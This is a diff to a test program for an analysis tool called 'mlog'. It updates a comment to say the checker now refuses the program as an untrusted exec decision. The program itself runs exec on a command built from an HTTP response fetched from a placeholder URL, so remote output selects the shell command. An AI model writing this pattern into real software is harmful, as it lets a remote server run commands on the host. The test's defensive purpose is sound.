@@ -1,7 +1,9 @@
-// №948 boundary pin B4 (audit PoC e02): network output steers exec
-// through a pattern — the model/remote output selects the command.
-// CURRENT behavior (v0.39.0): mlog check passes. Flip target: №950 —
-// the exec lane through the summary rules -> UNTRUSTED_EXEC_DECISION.
+// №948 boundary pin B4 (audit PoC e02) — FLIPPED by №950.
+// Network output steered exec through a pattern: the remote response
+// selected the command, with `mlog check` clean on v0.39.0. Now the
+// call site re-decides the exec clearance with the actual argument label
+// (ADR-0154 §12.2 (б)) and this program is the
+// [UNTRUSTED_EXEC_DECISION] refusal — a leak-suite negative.
 pattern Sh(c: String) -> String { return exec(c) }
 pattern P(x: String) -> String { return Sh("ls " + http_get("https://example.com/cmd")) }
 flow Main { input: String = "x" -> P -> output }
